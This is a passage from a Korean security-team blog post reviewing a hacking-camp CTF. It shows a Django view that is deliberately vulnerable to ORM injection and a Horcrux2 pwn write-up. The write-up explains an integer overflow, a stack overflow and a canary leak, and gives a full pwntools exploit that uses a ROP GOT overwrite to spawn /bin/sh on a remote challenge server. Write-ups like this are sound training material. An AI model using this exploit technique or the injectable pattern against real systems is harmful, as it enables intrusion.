<p>CTF&#xAC00; &#xB05D;&#xB098;&#xACE0; &#xCD9C;&#xC81C;&#xC790;&#xC758; &#xD480;&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xBB38;&#xC81C;&#xAC00; &#xD574;&#xB2F9; &#xBC84;&#xC804; EmailValidator&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xB358; redos &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; race condition&#xC744; &#xC870;&#xAE08; &#xB354; &#xD3B8;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xAC83;&#xC744; &#xC5FC;&#xB450;&#xD558;&#xACE0; &#xB0C8;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC800;&#xB294; &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xB358; ORM &#xCC98;&#xB9AC;&#xC5D0;&#xC11C; sqli &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xBD80;&#xBD84; &#xC2DC;&#xAC04;&#xC744; &#xD560;&#xC560;&#xD558;&#xC5EC; &#xACB0;&#xAD6D; &#xC815;&#xADDC;&#xC2DC;&#xAC04; &#xB0B4;&#xC5D0;&#xB294; &#xD480;&#xC9C0; &#xBABB;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>(<del>&#xCD9C;&#xC81C;&#xC790;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD568;&#xC815;&#xC744; &#xD30C;&#xB450;&#xC5C8;&#xAC70;&#xB4E0;&#xC694;</del>)</p>
<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VerySuspiciousView</span>(<span class="hljs-params">View</span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, request</span>):</span>
        field = request.GET.get(<span class="hljs-string">&quot;field&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
        value = request.GET.get(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)

        len(
            ProductModel.objects.annotate(**{field: Value(value)})
        )

        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;OK&quot;</span>)
</code></pre>
<p>CCE&#xC5D0;&#xC11C;&#xB3C4; &#xADF8;&#xB807;&#xACE0; race condition&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC870;&#xAE08; &#xB354; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xAC8C; &#xB41C; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="Horcrux2-pwndorei"><a href="#Horcrux2-pwndorei" class="headerlink" title="Horcrux2 - pwndorei"></a>Horcrux2 - pwndorei</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>&#xC774; &#xBB38;&#xC81C;&#xB294; <code>main</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>DrinkPotion</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>DrinkPotion</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>BreakHorcrux</code>&#xC5D0;&#xC11C; Stack Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Stack BOF&#xAC00; &#xBC1C;&#xC0DD;&#xD574;&#xB3C4; &#xCE74;&#xB098;&#xB9AC;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xACE0; PIE&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC740; &#xC810;, Partial RELRO&#xC778; &#xC810;&#xC744; &#xD1B5;&#xD574; ROP&#xB85C; GOT overwrite&#xB97C; &#xD574;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><code>DrinkPotion</code>&#xD568;&#xC218;&#xB97C; &#xBA3C;&#xC800; &#xBCF4;&#xC790;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-function">__int64 <span class="hljs-title">DrinkPotion</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
  __int64 result; <span class="hljs-comment">// rax</span>
  <span class="hljs-keyword">int</span> amount; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span>
  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>

  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);
  v2 = <span class="hljs-number">-1</span>;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How much will you drink? &gt;&gt;&gt; &quot;</span>);
  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;amount);
  <span class="hljs-keyword">if</span> ( amount &lt;= <span class="hljs-number">40</span> )
  {
    v2 += amount;                               
    <span class="hljs-keyword">if</span> ( (v2 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> )               <span class="hljs-comment">// no negative number</span>
      BreakHorcrux(v2);
    <span class="hljs-keyword">else</span>
      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You&apos;re out of HP. You&apos;re dead.&quot;</span>);
    result = <span class="hljs-number">0L</span>L;
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You drank too much. You&apos;re poisoned to death.&quot;</span>);
    result = <span class="hljs-number">0L</span>L;
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p><code>amount</code>&#xC5D0; <code>scanf</code>&#xB85C; &#xC815;&#xC218; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC785;&#xB825; &#xBC1B;&#xACE0; <code>BreakHorcrux</code>&#xC5D0; &#xC804;&#xB2EC;&#xB420; &#xC778;&#xC790;&#xC778; <code>v2</code>&#xB294; -1&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>amount</code>&#xAC00; 40&#xBCF4;&#xB2E4; &#xD06C;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; if &#xBB38;&#xC758; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xC5EC; <code>v2</code>&#xC5D0; <code>amount</code>&#xB97C; &#xB354;&#xD558;&#xACE0; <code>v2</code>&#xAC00; &#xC74C;&#xC218;&#xAC00; &#xC544;&#xB2C8;&#xBA74; <code>BreakHorcrux</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; amount&#xB97C; <code>%d</code>&#xB85C; &#xC785;&#xB825; &#xBC1B;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC74C;&#xC218;&#xB97C; &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xACE0; int &#xC790;&#xB8CC;&#xD615;&#xC758; &#xCD5C;&#xC19F;&#xAC12;&#xC744; &#xC785;&#xB825;&#xD558;&#xBA74; -1&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>v2</code>&#xC640; &#xB354;&#xD558;&#xBA74;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; <code>v2</code>&#xB294; int &#xC790;&#xB8CC;&#xD615;&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xD6C4; <code>BreakHorcrux</code>&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> __fastcall <span class="hljs-title">BreakHorcrux</span><span class="hljs-params">(<span class="hljs-keyword">int</span> potion_cnt)</span></span>
<span class="hljs-function"></span>{
  __int64 buf[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="hljs-keyword">unsigned</span> __int64 canary; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>

  canary = __readfsqword(<span class="hljs-number">0x28</span>u);
  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0L</span>L;
  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0L</span>L;
  buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0L</span>L;
  buf[<span class="hljs-number">3</span>] = <span class="hljs-number">0L</span>L;
  buf[<span class="hljs-number">4</span>] = <span class="hljs-number">0L</span>L;
  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;First Chance: &quot;</span>, <span class="hljs-number">0xE</span>uLL);
  read(<span class="hljs-number">0</span>, buf, potion_cnt);
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s is not a password.\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)buf);
  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Second Chance: &quot;</span>, <span class="hljs-number">0xF</span>uLL);
  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, potion_cnt);
}</code></pre>
<p><code>DrinkPotion</code>&#xC758; Integer Overflow&#xB97C; &#xD1B5;&#xD574; <code>potion_cnt</code>&#xC5D0; int &#xCD5C;&#xB313;&#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD06C;&#xAE30;&#xAC00; 40&#xBC14;&#xC774;&#xD2B8;&#xC778; <code>buf</code>&#xC5D0;&#xC11C; stack bof&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>read</code>&#xD568;&#xC218;&#xB85C; <code>buf</code>&#xC5D0; <code>potion_cnt</code>&#xB9CC;&#xD07C; &#xCD1D; &#xB450; &#xBC88; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xB294;&#xB370; &#xCCAB; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xC740; <code>buf</code>&#xB97C; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xCD9C;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xC5D0;&#xC11C; &#xCE74;&#xB098;&#xB9AC;&#xC758; &#xCCAB; &#xB110; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xB2E4;&#xB978; &#xAC12;&#xC73C;&#xB85C; &#xB36E;&#xC5B4; &#xCE74;&#xB098;&#xB9AC;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xC5D0;&#xC11C; &#xCE74;&#xB098;&#xB9AC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD574; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&apos;debug&apos;</span>

elf = ELF(<span class="hljs-string">&quot;./horcrux2&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)
<span class="hljs-comment">#libc = elf.libc</span>

<span class="hljs-comment">#p = process(&quot;./horcrux2&quot;)</span>
p = remote(<span class="hljs-string">&quot;15.165.100.234&quot;</span>,<span class="hljs-number">32859</span>)

int_overflow = <span class="hljs-number">-2147483648</span>

p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, str(int_overflow).encode())

p.sendline(cyclic(<span class="hljs-number">40</span>, n=<span class="hljs-number">8</span>))

p.recvuntil(cyclic(<span class="hljs-number">40</span>, n=<span class="hljs-number">8</span>)+<span class="hljs-string">b&apos;\n&apos;</span>)

canary = u64(<span class="hljs-string">b&apos;\x00&apos;</span>+p.recv(<span class="hljs-number">7</span>))

print(hex(canary))

payload = cyclic(<span class="hljs-number">40</span>, n=<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>

<span class="hljs-comment">#ROP</span>
<span class="hljs-comment">#gadgets</span>
pop_rdi = p64(<span class="hljs-number">0x0000000000400ab3</span>)
pop_rsi_r15 = p64(<span class="hljs-number">0x0000000000400ab1</span>)
pop_rdx = p64(<span class="hljs-number">0x00000000004008af</span>)
ret = p64(<span class="hljs-number">0x0000000000400696</span>)

payload += pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi_r15 + p64(elf.got[<span class="hljs-string">&apos;write&apos;</span>]) + p64(<span class="hljs-number">0</span>) + pop_rdx + p64(<span class="hljs-number">8</span>) + p64(elf.plt[<span class="hljs-string">&apos;write&apos;</span>]) <span class="hljs-comment"># write(1, write@got, 8)</span>
payload += pop_rdi + p64(<span class="hljs-number">0</span>) + pop_rsi_r15 + p64(elf.got[<span class="hljs-string">&apos;write&apos;</span>]) + p64(<span class="hljs-number">0</span>) + pop_rdx + p64(<span class="hljs-number">8</span>) + p64(elf.plt[<span class="hljs-string">&apos;read&apos;</span>]) <span class="hljs-comment"># read(0, write@got, 8)</span>
payload += pop_rdi + p64(<span class="hljs-number">0</span>) + pop_rsi_r15 + p64(elf.bss()) + p64(<span class="hljs-number">0</span>) + pop_rdx + p64(<span class="hljs-number">8</span>) + p64(elf.plt[<span class="hljs-string">&apos;read&apos;</span>]) <span class="hljs-comment"># read(0, bss, 8)</span>
payload += pop_rdi + p64(elf.bss()) + ret + p64(elf.plt[<span class="hljs-string">&apos;write&apos;</span>])<span class="hljs-comment"># system(&quot;/bin/sh&quot;)</span>

p.recvuntil(<span class="hljs-string">b&apos;Second Chance: &apos;</span>)
p.send(payload)

libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - libc.sym[<span class="hljs-string">&apos;write&apos;</span>] <span class="hljs-comment">#write</span>

p.send(p64(libc_base + libc.sym[<span class="hljs-string">&apos;system&apos;</span>]))
p.send(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)

p.interactive()</code></pre>
<h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xC138; &#xBA85; &#xBAA8;&#xB450; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xCC38;&#xC5EC;&#xD558;&#xB294; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC600;&#xB294;&#xB370;, &#xCCAB; &#xCC38;&#xC5EC;&#xC784;&#xC5D0;&#xB3C4; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xCC38;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xBC30;&#xB824;&#xD574;&#xC8FC;&#xC2E0; &#xB178;&#xB825;&#xB4E4;&#xC774; &#xB290;&#xAEF4;&#xC838; &#xC990;&#xAC81;&#xAC8C; &#xCC38;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB3D9;&#xC544;&#xB9AC;&#xC6D0;&#xB4E4;&#xC774;&#xB098; &#xBCF4;&#xC548;&#xD558;&#xB294; &#xD6C4;&#xBC30;&#xB4E4;&#xC5D0;&#xAC8C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xAF2D; &#xCC38;&#xC5EC;&#xD574;&#xBCF4;&#xB77C;&#xACE0; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xCD94;&#xCC9C;&#xD558;&#xACE0; &#xC2F6;&#xB124;&#xC694; :)</p>
<p>&#xC88B;&#xC740; &#xAD50;&#xB958;&#xC758; &#xC790;&#xB9AC;&#xB97C; &#xB9C8;&#xB828;&#xD574;&#xC8FC;&#xC2E0; PoC Security, Demon&#xD300;, SISS, &#xD6C4;&#xC6D0;&#xC0AC; &#xBC0F; &#xBC1C;&#xD45C;&#xC790; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xAC10;&#xC0AC;&#xC758; &#xB9D0;&#xC500;&#xC744; &#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;! </p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/picture1.jpg" srcset="/img/loading.gif" alt="picture1"></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Daily-Life/">Daily-Life</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                  
                  <a class="hover-with-bg" href="/tags/write-up/">write-up</a>
                  
                  <a class="hover-with-bg" href="/tags/syru/">syru</a>
                  
                  <a class="hover-with-bg" href="/tags/pwndorei/">pwndorei</a>
                  
                  <a class="hover-with-bg" href="/tags/poc-security/">poc security</a>
                  
                  <a class="hover-with-bg" href="/tags/demon/">demon</a>
                  
                  <a class="hover-with-bg" href="/tags/siss/">siss</a>
                  
                  <a class="hover-with-bg" href="/tags/hackingcamp/">hackingcamp</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_L0ch.jpg" srcset="/img/loading.gif" alt="L0ch">
                  </div>

                  <div class="link-text">
                    <div class="link-title">L0ch</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/L0ch">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>

              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2023/09/30/pwndorei/newjeans-hyper-v-pt1/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[Research] NewJeans' Hyper-V Part 1 - Hyper-V Architecture</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2023/09/01/syru/sstf-web-libreria/">
                    <span class="hidden-mobile">[Write-Up] SSTF : libreria & libreria pro</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2023/09/03/l0ch/hackingcamp_review/';
        this.page.identifier = '/2023/09/03/l0ch/hackingcamp_review/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Daily-Life] 27  Review&Write-Up&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
